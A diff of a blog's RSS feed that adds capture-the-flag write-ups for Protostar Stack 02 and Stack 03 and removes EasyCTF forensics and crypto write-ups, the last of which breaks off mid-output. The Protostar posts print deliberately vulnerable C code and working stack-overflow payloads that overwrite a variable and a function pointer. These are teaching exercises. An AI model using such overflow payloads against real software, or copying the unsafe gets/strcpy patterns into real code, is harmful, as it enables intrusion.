@@ -7,6 +7,152 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>Protostar - Stack 03</title>
+        <description>&lt;p&gt;Let’s start by looking at the source code of the challenge.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;code flow successfully changed&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)();&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;calling function pointer, jumping to 0x%08x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As you can see we have additional &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; function that we have to call. In the main we have function pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;fp&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;buffer&lt;/code&gt;. As the pointer in the code is assigned &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, no function is called. But what will happen if we would assign &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt; to fp? Then in &lt;code class=&quot;highlighter-rouge&quot;&gt;fp();&lt;/code&gt;, the function would be called.&lt;/p&gt;
+
+&lt;p&gt;In order to complete that, we have to find the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; function. We can do this in both &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;objdump&lt;/code&gt;, but in this task objdump will be faster.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; stack3
+
+stack3:     file format elf32-i386
+
+08048424 &amp;lt;win&amp;gt;:
+ 8048424:	55                   	push   %ebp
+ 8048425:	89 e5                	mov    %esp,%ebp
+ 8048427:	83 ec 18             	sub    &lt;span class=&quot;nv&quot;&gt;$0x18&lt;/span&gt;,%esp
+ 804842a:	c7 04 24 40 85 04 08 	movl   &lt;span class=&quot;nv&quot;&gt;$0x8048540&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 8048431:	e8 2a ff ff ff       	call   8048360 &amp;lt;puts@plt&amp;gt;
+ 8048436:	c9                   	leave  
+ 8048437:	c3                   	ret    
+
+08048438 &amp;lt;main&amp;gt;:
+ 8048438:	55                   	push   %ebp
+ 8048439:	89 e5                	mov    %esp,%ebp
+ 804843b:	83 e4 f0             	and    &lt;span class=&quot;nv&quot;&gt;$0xfffffff0&lt;/span&gt;,%esp
+ 804843e:	83 ec 60             	sub    &lt;span class=&quot;nv&quot;&gt;$0x60&lt;/span&gt;,%esp
+ 8048441:	c7 44 24 5c 00 00 00 	movl   &lt;span class=&quot;nv&quot;&gt;$0x0&lt;/span&gt;,0x5c&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 8048448:	00
+ 8048449:	8d 44 24 1c          	lea    0x1c&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
+ 804844d:	89 04 24             	mov    %eax,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 8048450:	e8 db fe ff ff       	call   8048330 &amp;lt;gets@plt&amp;gt;
+ 8048455:	83 7c 24 5c 00       	cmpl   &lt;span class=&quot;nv&quot;&gt;$0x0&lt;/span&gt;,0x5c&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 804845a:	74 1b                	je     8048477 &amp;lt;main+0x3f&amp;gt;
+ 804845c:	b8 60 85 04 08       	mov    &lt;span class=&quot;nv&quot;&gt;$0x8048560&lt;/span&gt;,%eax
+ 8048461:	8b 54 24 5c          	mov    0x5c&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%edx
+ 8048465:	89 54 24 04          	mov    %edx,0x4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 8048469:	89 04 24             	mov    %eax,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 804846c:	e8 &lt;span class=&quot;nb&quot;&gt;df &lt;/span&gt;fe ff ff       	call   8048350 &amp;lt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt&amp;gt;
+ 8048471:	8b 44 24 5c          	mov    0x5c&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
+ 8048475:	ff d0                	call   &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;%eax
+ 8048477:	c9                   	leave  
+ 8048478:	c3                   	ret    
+ 8048479:	90                   	nop
+ 804847a:	90                   	nop
+ 804847b:	90                   	nop
+ 804847c:	90                   	nop
+ 804847d:	90                   	nop
+ 804847e:	90                   	nop
+ 804847f:	90                   	nop&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Some of the output is omitted for clearability, here we have the most important information - &lt;code class=&quot;highlighter-rouge&quot;&gt;08048424 &amp;lt;win&amp;gt;&lt;/code&gt; - that’s our address &lt;code class=&quot;highlighter-rouge&quot;&gt;08048424&lt;/code&gt;. Now we have to pass this to the binary, together with 64 bytes that will fill the buffer.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print(&quot;A&quot; * 64 + &quot;\x24\x84\x04\x08&quot;)'&lt;/span&gt; | ./stack3
+ calling &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;pointer, jumping to 0x08048424
+ code flow successfully changed&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+</description>
+        <pubDate>Sat, 12 May 2018 02:00:00 +0200</pubDate>
+        <link>http://localhost:4000/protostar-3/</link>
+        <guid isPermaLink="true">http://localhost:4000/protostar-3/</guid>
+      </item>
+    
+      <item>
+        <title>Protostar - Stack 02</title>
+        <description>&lt;p&gt;Let’s take a look at the code of this challenge.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;modified&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;variable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;variable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GREENIE&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;variable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;errx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;please set the GREENIE environment variable&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;modified&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+  &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;variable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;modified&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0d0a0d0a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;you have correctly modified the variable&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Try again, you got 0x%08x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;modified&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As we can see, there’s the &lt;code class=&quot;highlighter-rouge&quot;&gt;buffer&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;modified&lt;/code&gt; variable and &lt;code class=&quot;highlighter-rouge&quot;&gt;variable&lt;/code&gt; that is loaded from the environment variable &lt;code class=&quot;highlighter-rouge&quot;&gt;GREENIE&lt;/code&gt; and copied into the buffer. In addition we have different if statement to satisfy - &lt;code class=&quot;highlighter-rouge&quot;&gt;if(modified == 0x0d0a0d0a)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./stack2
+stack2: please &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;the GREENIE environment variable&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;But let’s remember the previous challenges and keep in mind that 66 bytes will overwrite 2 bytes from the &lt;code class=&quot;highlighter-rouge&quot;&gt;modified&lt;/code&gt; variable. We can now simply export the &lt;code class=&quot;highlighter-rouge&quot;&gt;GREENIE&lt;/code&gt; environment variable and assign to it 66 &lt;code class=&quot;highlighter-rouge&quot;&gt;A&lt;/code&gt; letters.&lt;/p&gt;
+
+&lt;p&gt;What will happen?&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;GREENIE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./stack2
+Try again, you got 0x00004141&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As you can see that’s the same kind of vulnerability as in the previous challenges. Now we can finish it with last commands.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ GREENIE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot;*64+&quot;\x0a\x0d\x0a\x0d&quot;'&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;GREENIE
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./stack2
+you have correctly modified the variable&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+</description>
+        <pubDate>Sat, 05 May 2018 02:00:00 +0200</pubDate>
+        <link>http://localhost:4000/protostar-2/</link>
+        <guid isPermaLink="true">http://localhost:4000/protostar-2/</guid>
+      </item>
+    
+      <item>
         <title>Protostar - Stack 01</title>
         <description>&lt;p&gt;Let’s start by looking at the source code of the challenge.&lt;/p&gt;
 
@@ -1925,205 +2071,6 @@ bye&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
         <pubDate>Sun, 25 Feb 2018 01:00:00 +0100</pubDate>
         <link>http://localhost:4000/pwnable.kr-lotto/</link>
         <guid isPermaLink="true">http://localhost:4000/pwnable.kr-lotto/</guid>
-      </item>
-    
-      <item>
-        <title>EasyCTF 2018 - My Letter</title>
-        <description>&lt;p&gt;This time we’re walking through the challenge called &lt;strong&gt;&lt;em&gt;My Letter&lt;/em&gt;&lt;/strong&gt; from the forenscics category.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Category: Forensics&lt;/li&gt;
-  &lt;li&gt;Points: 80&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;I got a letter in my email the other day... It makes me feel sad, but maybe it'll make you glad. :( file&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;You can find full problem info &lt;a href=&quot;https://github.com/EasyCTF/easyctf-iv-problems/tree/master/my_letter&quot;&gt;here&lt;/a&gt;, together with the original file.&lt;/p&gt;
-
-&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
-
-&lt;p&gt;Firstly, let’s view the file with a docx viewer like &lt;code class=&quot;highlighter-rouge&quot;&gt;Libre Office Writer&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/easyctf/my_letter.png&quot; alt=&quot;My Letter&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;As you can see, some of the letters are bolded. Let’s delete the rest and see what we’ll get.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/easyctf/rick_roll.png&quot; alt=&quot;Rick Roll&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Just a troll :D&lt;/p&gt;
-
-&lt;p&gt;But let’s remember that docx is actually made of a zip, so let’s change the into &lt;code class=&quot;highlighter-rouge&quot;&gt;my_letter.zip&lt;/code&gt; and unpack it. Maybe its content will show us the flag?&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;main:~/projects/easyctf/word &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-razem 76
-drwxr-xr-x  5 w3ndige &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;4096 02-22 11:25  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 11 w3ndige &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;4096 02-22 11:25  ..
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 w3ndige &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;1427 02-10 21:17 &lt;span class=&quot;s1&quot;&gt;'[Content_Types].xml'&lt;/span&gt;
-drwx------  2 w3ndige &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;4096 02-22 11:25  docProps
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 w3ndige &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;36679 02-11 12:09  letter.zip
-drwx------  2 w3ndige &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;4096 02-22 11:25  _rels
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 w3ndige &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;15623 02-10 21:13  template.png
-drwx------  5 w3ndige &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;4096 02-22 11:25  word&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;An image? Let’s take a look.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/easyctf/template.png&quot; alt=&quot;Template&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;tools&quot;&gt;Tools&lt;/h3&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Libre Office Writer&lt;/code&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;
-&lt;p&gt;&lt;a href=&quot;http://www.forensicswiki.org/wiki/Word_Document_(DOCX)&quot;&gt;http://www.forensicswiki.org/wiki/Word_Document_(DOCX)&lt;/a&gt;&lt;/p&gt;
-</description>
-        <pubDate>Thu, 22 Feb 2018 03:00:00 +0100</pubDate>
-        <link>http://localhost:4000/easyctf-my-letter/</link>
-        <guid isPermaLink="true">http://localhost:4000/easyctf-my-letter/</guid>
-      </item>
-    
-      <item>
-        <title>EasyCTF 2018 - Not OTP</title>
-        <description>&lt;p&gt;Today we’re going through cryptography challenge from EasyCTF called &lt;strong&gt;&lt;em&gt;Not OTP&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Category: Crypto&lt;/li&gt;
-  &lt;li&gt;Points: 100&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;It seems we've intercepted 2 strings that were both encrypted with what looks like OTP! Is it possible to decrypt them?
-
-c1 = 38445d4e5311544249005351535f005d5d0c575b5e4f481155504e495740145f4c505c5c0e196044454817564d4e12515a5f4f12465c4a45431245430050154b4d4d415c560c4f54144440415f595845494c125953575513454e11525e484550424941595b5a4b
-c2 = 3343464b415550424b415551454b00405b4553135e5f00455f540c535750464954154a5852505a4b00455f5458004b5f430c575b58550c4e5444545e0056405d5f53101055404155145d5f0053565f59524c54574f46416c5854416e525e11506f485206554e51&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;In addition we get a hint telling us that there’s something about the &lt;strong&gt;&lt;em&gt;cribs&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
-
-&lt;p&gt;As the hint is about cribs, I decided to firstly use an attack called &lt;strong&gt;&lt;em&gt;crib dragging&lt;/em&gt;&lt;/strong&gt;, which works only when two messages are encrypted (xored as in OTP) using the same key. AS you probably know, OTP is only safe when each message has it’s own, unique key.&lt;/p&gt;
-
-&lt;p&gt;But back to the attack. To make sure the attack will work, we have to know some of the plaintext from one of the messages. It may be part of the flag, most common English words etc. Firstly, we xor two messages together. Then we xor the suspected plaintext with the xored messages, but at each position of the messages. If this operation produces some readable English text, we may suspect that the plaintext was a part of the message.&lt;/p&gt;
-
-&lt;p&gt;Now as we know the basics, let’s get into the task.&lt;/p&gt;
-
-&lt;p&gt;To make solution easier and the process of attacking faster, I decided to use a ready tool called &lt;a href=&quot;https://github.com/SpiderLabs/cribdrag&quot;&gt;CribDrag&lt;/a&gt; made by Daniel Crowley. Thanks!&lt;/p&gt;
-
-&lt;p&gt;From now we’re ready to attack both ciphertexts. Firstly, we’ll have to xor them with each other but luckily, CribDrag has separate script to do this.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;main:~/projects/easyctf/cribdrag &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; python2 xorstrings.py 38445d4e5311544249005351535f005d5d0c575b5e4f481155504e495740145f4c505c5c0e196044454817564d4e12515a5f4f12465c4a45431245430050154b4d4d415c560c4f54144440415f595845494c125953575513454e11525e484550424941595b5a4b 3343464b415550424b415551454b00405b4553135e5f00455f540c535750464954154a5852505a4b00455f5458004b5f430c575b58550c4e5444545e0056405d5f53101055404155145d5f0053565f59524c54574f46416c5854416e525e11506f485206554e51
-0b071b0512440400024106001614001d06490448001048540a04421a00105216184516045c493a0f450d4802154e590e195318491e09460b1756111d00065516121e514c034c0e0100191f410c0f071c1b00460e1c11147f1d1a503c0c1654002d01135f0e141&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now let’s the output and run it in cribdrag.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;main:~/projects/easyctf/cribdrag &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; python2 cribdrag.py 0b071b0512440400024106001614001d06490448001048540a04421a00105216184516045c493a0f450d4802154e590e195318491e09460b1756111d00065516121e514c034c0e0100191f410c0f071c1b00460e1c11147f1d1a503c0c1654002d01135f0e141a
-Your message is currently:
-0	________________________________________
-40	________________________________________
-80	_______________________
-Your key is currently:
-0	________________________________________
-40	________________________________________
-80	_______________________
-Please enter your crib:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now the guessing part! Firstly, we know that the message will contain &lt;code class=&quot;highlighter-rouge&quot;&gt;easyctf{&lt;/code&gt; part as it’s part of the flag.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;74: &lt;span class=&quot;s2&quot;&gt;&quot;z vdh}{&quot;&lt;/span&gt;
